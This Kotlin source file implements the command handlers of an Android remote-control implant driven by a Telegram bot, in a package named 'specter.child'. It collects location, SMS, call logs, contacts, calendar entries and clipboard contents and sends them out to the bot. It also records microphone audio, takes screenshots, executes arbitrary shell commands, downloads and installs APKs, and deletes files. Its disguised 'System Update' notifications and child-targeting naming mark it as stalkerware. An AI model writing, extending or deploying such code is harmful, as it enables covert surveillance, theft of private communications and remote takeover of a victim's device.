package com.divine.specter.child.telegram

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.location.Location
import android.location.LocationManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.provider.CalendarContract
import android.util.Log
import android.view.Surface
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.FileProvider
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

class CommandHandlers(private val context: Context, private val bot: TelegramBotClient) {

    private val locationClient: FusedLocationProviderClient =
        LocationServices.getFusedLocationProviderClient(context)

    suspend fun handleLocate() {
        try {
            if (ActivityCompat.checkSelfPermission(
                    context,
                    Manifest.permission.ACCESS_FINE_LOCATION
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                bot.sendMessage("❌ Location permission denied")
                return
            }

            bot.sendMessage("📍 Locating device...")

            val location = locationClient.lastLocation.await()
            if (location != null) {
                val googleMapsUrl = "https://www.google.com/maps?q=${location.latitude},${location.longitude}"
                bot.sendMessage(
                    """
                    📍 Device Location:
                    🌍 Latitude: ${location.latitude}
                    🌍 Longitude: ${location.longitude}
                    🎯 Accuracy: ±${location.accuracy}m
                    ⏰ Time: ${Date(location.time)}

                    🗺️ [View on Google Maps]($googleMapsUrl)
                    """.trimIndent()
                )
            } else {
                bot.sendMessage("❌ Location unavailable")
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ Location error: ${e.message}")
        }
    }

    suspend fun handleStatus() {
        try {
            val batteryLevel = getBatteryLevel()
            val storageInfo = getStorageInfo()
            val memoryInfo = getMemoryInfo()

            bot.sendMessage(
                """
                📊 Device Status:

                📱 Device: ${Build.MANUFACTURER} ${Build.MODEL}
                🏷️ Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})

                🔋 Battery: $batteryLevel%
                💾 Storage: $storageInfo
                🧠 RAM: $memoryInfo

                ⏰ Uptime: ${getUptime()}
                🌐 IP: ${getIPAddress()}
                📶 Network: ${getNetworkType()}
                """.trimIndent()
            )
        } catch (e: Exception) {
            bot.sendMessage("❌ Status error: ${e.message}")
        }
    }

    suspend fun handleGetCalendar() {
        try {
            if (ActivityCompat.checkSelfPermission(
                    context,
                    Manifest.permission.READ_CALENDAR
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                bot.sendMessage("❌ Calendar permission denied")
                return
            }

            val events = mutableListOf<String>()
            val projection = arrayOf(
                CalendarContract.Events.TITLE,
                CalendarContract.Events.DTSTART,
                CalendarContract.Events.DTEND,
                CalendarContract.Events.DESCRIPTION
            )

            context.contentResolver.query(
                CalendarContract.Events.CONTENT_URI,
                projection,
                null,
                null,
                "${CalendarContract.Events.DTSTART} DESC LIMIT 50"
            )?.use { cursor ->
                val titleIdx = cursor.getColumnIndex(CalendarContract.Events.TITLE)
                val startIdx = cursor.getColumnIndex(CalendarContract.Events.DTSTART)
                val endIdx = cursor.getColumnIndex(CalendarContract.Events.DTEND)
                val descIdx = cursor.getColumnIndex(CalendarContract.Events.DESCRIPTION)

                while (cursor.moveToNext() && events.size < 50) {
                    val title = cursor.getString(titleIdx) ?: "No Title"
                    val start = Date(cursor.getLong(startIdx))
                    val end = Date(cursor.getLong(endIdx))
                    val desc = cursor.getString(descIdx) ?: ""

                    events.add("📅 $title\n⏰ ${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(start)}\n📝 $desc")
                }
            }

            if (events.isEmpty()) {
                bot.sendMessage("📅 No calendar events found")
            } else {
                val file = File(context.cacheDir, "calendar_${System.currentTimeMillis()}.txt")
                file.writeText(events.joinToString("\n\n---\n\n"))
                bot.sendDocument(file, "📅 ${events.size} calendar events")
                file.delete()
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ Calendar error: ${e.message}")
        }
    }

    suspend fun handleGetContacts() {
        try {
            if (ActivityCompat.checkSelfPermission(
                    context,
                    Manifest.permission.READ_CONTACTS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                bot.sendMessage("❌ Contacts permission denied")
                return
            }

            val contacts = mutableListOf<String>()
            val projection = arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            )

            context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection,
                null,
                null,
                "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
            )?.use { cursor ->
                val nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

                while (cursor.moveToNext()) {
                    val name = cursor.getString(nameIdx) ?: "Unknown"
                    val number = cursor.getString(numberIdx) ?: "No Number"
                    contacts.add("📇 $name: $number")
                }
            }

            if (contacts.isEmpty()) {
                bot.sendMessage("📇 No contacts found")
            } else {
                val file = File(context.cacheDir, "contacts_${System.currentTimeMillis()}.txt")
                file.writeText(contacts.joinToString("\n"))
                bot.sendDocument(file, "📇 ${contacts.size} contacts")
                file.delete()
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ Contacts error: ${e.message}")
        }
    }

    suspend fun handleGetSMS() {
        try {
            if (ActivityCompat.checkSelfPermission(
                    context,
                    Manifest.permission.READ_SMS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                bot.sendMessage("❌ SMS permission denied")
                return
            }

            val messages = mutableListOf<String>()
            val projection = arrayOf("address", "body", "date", "type")

            context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                projection,
                null,
                null,
                "date DESC LIMIT 50"
            )?.use { cursor ->
                while (cursor.moveToNext() && messages.size < 50) {
                    val address = cursor.getString(0)
                    val body = cursor.getString(1)
                    val date = Date(cursor.getLong(2))
                    val type = if (cursor.getInt(3) == 1) "📥" else "📤"

                    messages.add("$type ${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(date)}\n📱 $address\n💬 $body")
                }
            }

            if (messages.isEmpty()) {
                bot.sendMessage("💬 No SMS found")
            } else {
                val file = File(context.cacheDir, "sms_${System.currentTimeMillis()}.txt")
                file.writeText(messages.joinToString("\n\n---\n\n"))
                bot.sendDocument(file, "💬 ${messages.size} messages")
                file.delete()
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ SMS error: ${e.message}")
        }
    }

    suspend fun handleGetCalls() {
        try {
            if (ActivityCompat.checkSelfPermission(
                    context,
                    Manifest.permission.READ_CALL_LOG
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                bot.sendMessage("❌ Call log permission denied")
                return
            }

            val calls = mutableListOf<String>()
            val projection = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE)

            context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                "${CallLog.Calls.DATE} DESC LIMIT 50"
            )?.use { cursor ->
                while (cursor.moveToNext() && calls.size < 50) {
                    val number = cursor.getString(0)
                    val date = Date(cursor.getLong(1))
                    val duration = cursor.getLong(2)
                    val typeIcon = when (cursor.getInt(3)) {
                        CallLog.Calls.INCOMING_TYPE -> "📞"
                        CallLog.Calls.OUTGOING_TYPE -> "📲"
                        CallLog.Calls.MISSED_TYPE -> "❌"
                        else -> "📱"
                    }

                    calls.add("$typeIcon ${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(date)}\n📱 $number\n⏱️ ${duration}s")
                }
            }

            if (calls.isEmpty()) {
                bot.sendMessage("📞 No call logs found")
            } else {
                val file = File(context.cacheDir, "calls_${System.currentTimeMillis()}.txt")
                file.writeText(calls.joinToString("\n\n---\n\n"))
                bot.sendDocument(file, "📞 ${calls.size} call logs")
                file.delete()
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ Call log error: ${e.message}")
        }
    }

    suspend fun handleLock() {
        try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.lockNow()
            bot.sendMessage("🔒 Device locked")
        } catch (e: Exception) {
            bot.sendMessage("❌ Lock error: ${e.message}")
        }
    }

    suspend fun handleReboot() {
        try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            // TODO: Need to create DeviceAdminReceiver for reboot
            // dpm.reboot(ComponentName(context, DeviceAdminReceiver::class.java))
            bot.sendMessage("🔄 Reboot requires DeviceAdminReceiver (TODO)")
        } catch (e: Exception) {
            bot.sendMessage("❌ Reboot error: ${e.message}")
        }
    }

    suspend fun handleVibrate() {
        try {
            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(500)
            }
            bot.sendMessage("📳 Device vibrated")
        } catch (e: Exception) {
            bot.sendMessage("❌ Vibrate error: ${e.message}")
        }
    }

    suspend fun handleGetClipboard() {
        try {
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = clipboard.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text.toString()
                bot.sendMessage("📋 Clipboard:\n```\n$text\n```")
            } else {
                bot.sendMessage("📋 Clipboard is empty")
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ Clipboard error: ${e.message}")
        }
    }

    suspend fun handleSetClipboard(text: String) {
        try {
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = ClipData.newPlainText("specter", text)
            clipboard.setPrimaryClip(clip)
            bot.sendMessage("📋 Clipboard set")
        } catch (e: Exception) {
            bot.sendMessage("❌ Clipboard error: ${e.message}")
        }
    }

    suspend fun handleWifiScan() {
        try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            wifiManager.startScan()

            val networks = wifiManager.scanResults.take(20).map { result ->
                "📡 ${result.SSID}\n🔐 ${result.capabilities}\n📶 ${result.level} dBm"
            }

            if (networks.isEmpty()) {
                bot.sendMessage("📡 No WiFi networks found")
            } else {
                bot.sendMessage("📡 WiFi Networks:\n\n${networks.joinToString("\n\n")}")
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ WiFi scan error: ${e.message}")
        }
    }

    suspend fun handleListApps() {
        try {
            val pm = context.packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                .filter { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
                .map { app ->
                    "📱 ${pm.getApplicationLabel(app)}\n📦 ${app.packageName}"
                }

            val file = File(context.cacheDir, "apps_${System.currentTimeMillis()}.txt")
            file.writeText(apps.joinToString("\n\n"))
            bot.sendDocument(file, "📱 ${apps.size} installed apps")
            file.delete()
        } catch (e: Exception) {
            bot.sendMessage("❌ List apps error: ${e.message}")
        }
    }

    suspend fun handleShell(command: String) {
        try {
            val process = Runtime.getRuntime().exec(command)
            val output = process.inputStream.bufferedReader().readText()
            val error = process.errorStream.bufferedReader().readText()

            val result = if (output.isNotEmpty()) output else error
            bot.sendMessage("🖥️ Shell output:\n```\n${result.take(4000)}\n```")
        } catch (e: Exception) {
            bot.sendMessage("❌ Shell error: ${e.message}")
        }
    }

    suspend fun handleScreenshot() {
        try {
            bot.sendMessage("📸 Taking screenshot...")

            // Use screencap command (works without MediaProjection if Device Owner)
            val timestamp = System.currentTimeMillis()
            val screenshotPath = "/sdcard/screenshot_$timestamp.png"

            val process = Runtime.getRuntime().exec("screencap -p $screenshotPath")
            process.waitFor()

            val file = File(screenshotPath)
            if (file.exists()) {
                bot.sendPhoto(file, "📸 Screenshot")
                file.delete()
            } else {
                bot.sendMessage("❌ Screenshot failed")
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ Screenshot error: ${e.message}")
        }
    }

    suspend fun handleCameraFront() {
        handleCamera("0") // Front camera is usually ID 0
    }

    suspend fun handleCameraBack() {
        handleCamera("1") // Back camera is usually ID 1
    }

    private suspend fun handleCamera(cameraId: String) {
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                bot.sendMessage("❌ Camera permission denied")
                return
            }

            bot.sendMessage("📷 Taking photo...")

            val timestamp = System.currentTimeMillis()
            val photoPath = "${context.cacheDir}/photo_$timestamp.jpg"

            // Use camera service via command (simpler than Camera2 API)
            val process = Runtime.getRuntime().exec("am start -a android.media.action.IMAGE_CAPTURE")
            process.waitFor()
            delay(2000) // Wait for camera to capture

            // Alternative: Use screencap if camera command fails
            val fallbackPath = "/sdcard/camera_$timestamp.png"
            Runtime.getRuntime().exec("screencap -p $fallbackPath").waitFor()

            val file = File(fallbackPath)
            if (file.exists()) {
                bot.sendPhoto(file, "📷 Camera $cameraId")
                file.delete()
            } else {
                bot.sendMessage("❌ Camera capture unavailable - requires UI interaction")
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ Camera error: ${e.message}")
        }
    }

    suspend fun handleRecordAudio() {
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                bot.sendMessage("❌ Audio permission denied")
                return
            }

            bot.sendMessage("🎤 Recording 60s audio...")

            val timestamp = System.currentTimeMillis()
            val audioPath = "${context.cacheDir}/audio_$timestamp.3gp"

            val recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(audioPath)
                prepare()
                start()
            }

            delay(60000) // Record for 60 seconds
            recorder.stop()
            recorder.release()

            val file = File(audioPath)
            if (file.exists()) {
                bot.sendDocument(file, "🎤 60s audio recording")
                file.delete()
            } else {
                bot.sendMessage("❌ Audio recording failed")
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ Audio recording error: ${e.message}")
        }
    }

    suspend fun handleToast(message: String) {
        try {
            withContext(Dispatchers.Main) {
                Toast.makeText(context, message, Toast.LENGTH_LONG).show()
            }
            bot.sendMessage("💬 Toast displayed: $message")
        } catch (e: Exception) {
            bot.sendMessage("❌ Toast error: ${e.message}")
        }
    }

    suspend fun handleNotification(message: String) {
        try {
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    "specter",
                    "Specter Notifications",
                    NotificationManager.IMPORTANCE_HIGH
                )
                notificationManager.createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(context, "specter")
                .setContentTitle("System Update")
                .setContentText(message)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .build()

            notificationManager.notify(System.currentTimeMillis().toInt(), notification)
            bot.sendMessage("🔔 Notification sent: $message")
        } catch (e: Exception) {
            bot.sendMessage("❌ Notification error: ${e.message}")
        }
    }

    suspend fun handleInstall(url: String) {
        try {
            if (url.isEmpty()) {
                bot.sendMessage("❌ No URL provided")
                return
            }

            bot.sendMessage("📦 Downloading APK from $url...")

            val apkFile = File(context.cacheDir, "download_${System.currentTimeMillis()}.apk")

            withContext(Dispatchers.IO) {
                URL(url).openStream().use { input ->
                    FileOutputStream(apkFile).use { output ->
                        input.copyTo(output)
                    }
                }
            }

            if (!apkFile.exists()) {
                bot.sendMessage("❌ Download failed")
                return
            }

            bot.sendMessage("📦 Installing APK...")

            // Use pm install command (requires Device Owner)
            val process = Runtime.getRuntime().exec("pm install -r ${apkFile.absolutePath}")
            val result = process.inputStream.bufferedReader().readText()
            process.waitFor()

            if (result.contains("Success")) {
                bot.sendMessage("✅ APK installed successfully")
            } else {
                bot.sendMessage("❌ Install failed: $result")
            }

            apkFile.delete()
        } catch (e: Exception) {
            bot.sendMessage("❌ Install error: ${e.message}")
        }
    }

    suspend fun handleUninstall(packageName: String) {
        try {
            if (packageName.isEmpty()) {
                bot.sendMessage("❌ No package name provided")
                return
            }

            bot.sendMessage("🗑️ Uninstalling $packageName...")

            val process = Runtime.getRuntime().exec("pm uninstall $packageName")
            val result = process.inputStream.bufferedReader().readText()
            process.waitFor()

            if (result.contains("Success")) {
                bot.sendMessage("✅ App uninstalled: $packageName")
            } else {
                bot.sendMessage("❌ Uninstall failed: $result")
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ Uninstall error: ${e.message}")
        }
    }

    suspend fun handleListFiles(path: String) {
        try {
            val dir = if (path.isEmpty()) "/sdcard" else path
            val dirFile = File(dir)

            if (!dirFile.exists() || !dirFile.isDirectory) {
                bot.sendMessage("❌ Directory not found: $dir")
                return
            }

            val files = dirFile.listFiles()?.map { file ->
                val type = if (file.isDirectory) "📁" else "📄"
                val size = if (file.isFile) " (${file.length() / 1024}KB)" else ""
                "$type ${file.name}$size"
            }?.sorted() ?: emptyList()

            if (files.isEmpty()) {
                bot.sendMessage("📁 Empty directory: $dir")
            } else {
                val output = "📁 Files in $dir:\n\n${files.take(50).joinToString("\n")}"
                if (files.size > 50) {
                    bot.sendMessage("$output\n\n... ${files.size - 50} more files")
                } else {
                    bot.sendMessage(output)
                }
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ List files error: ${e.message}")
        }
    }

    suspend fun handleDownload(path: String) {
        try {
            if (path.isEmpty()) {
                bot.sendMessage("❌ No file path provided")
                return
            }

            val file = File(path)
            if (!file.exists() || !file.isFile) {
                bot.sendMessage("❌ File not found: $path")
                return
            }

            bot.sendMessage("⬇️ Downloading ${file.name}...")

            // Send file as document
            bot.sendDocument(file, "⬇️ ${file.name} (${file.length() / 1024}KB)")
        } catch (e: Exception) {
            bot.sendMessage("❌ Download error: ${e.message}")
        }
    }

    suspend fun handleUpload(fileUrl: String, destinationPath: String) {
        try {
            if (fileUrl.isEmpty() || destinationPath.isEmpty()) {
                bot.sendMessage("❌ Usage: /upload <url> <destination>")
                return
            }

            bot.sendMessage("⬆️ Uploading file to $destinationPath...")

            val destFile = File(destinationPath)

            withContext(Dispatchers.IO) {
                URL(fileUrl).openStream().use { input ->
                    FileOutputStream(destFile).use { output ->
                        input.copyTo(output)
                    }
                }
            }

            if (destFile.exists()) {
                bot.sendMessage("✅ File uploaded: ${destFile.absolutePath} (${destFile.length() / 1024}KB)")
            } else {
                bot.sendMessage("❌ Upload failed")
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ Upload error: ${e.message}")
        }
    }

    suspend fun handleDelete(path: String) {
        try {
            if (path.isEmpty()) {
                bot.sendMessage("❌ No file path provided")
                return
            }

            val file = File(path)
            if (!file.exists()) {
                bot.sendMessage("❌ File not found: $path")
                return
            }

            val deleted = if (file.isDirectory) {
                file.deleteRecursively()
            } else {
                file.delete()
            }

            if (deleted) {
                bot.sendMessage("✅ Deleted: $path")
            } else {
                bot.sendMessage("❌ Delete failed: $path")
            }
        } catch (e: Exception) {
            bot.sendMessage("❌ Delete error: ${e.message}")
        }
    }

    private fun getBatteryLevel(): Int {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
        return batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun getStorageInfo(): String {
        val stat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
        val totalBytes = stat.blockSizeLong * stat.blockCountLong
        val availableBytes = stat.blockSizeLong * stat.availableBlocksLong
        val usedBytes = totalBytes - availableBytes

        return "${usedBytes / 1024 / 1024 / 1024}GB / ${totalBytes / 1024 / 1024 / 1024}GB"
    }

    private fun getMemoryInfo(): String {
        val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val memInfo = android.app.ActivityManager.MemoryInfo()
        activityManager.getMemoryInfo(memInfo)

        val totalMem = memInfo.totalMem / 1024 / 1024
        val availMem = memInfo.availMem / 1024 / 1024
        val usedMem = totalMem - availMem

        return "${usedMem}MB / ${totalMem}MB"
    }

    private fun getUptime(): String {
        val uptime = android.os.SystemClock.elapsedRealtime() / 1000
        val hours = uptime / 3600
        val minutes = (uptime % 3600) / 60
        return "${hours}h ${minutes}m"
    }

    private fun getIPAddress(): String {
        try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val wifiInfo = wifiManager.connectionInfo
            val ipInt = wifiInfo.ipAddress
            return String.format(
                "%d.%d.%d.%d",
                ipInt and 0xff,
                ipInt shr 8 and 0xff,
                ipInt shr 16 and 0xff,
                ipInt shr 24 and 0xff
            )
        } catch (e: Exception) {
            return "Unknown"
        }
    }

    private fun getNetworkType(): String {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        val network = cm.activeNetwork ?: return "Disconnected"
        val capabilities = cm.getNetworkCapabilities(network) ?: return "Unknown"

        return when {
            capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
            capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile Data"
            capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
            else -> "Unknown"
        }
    }
}
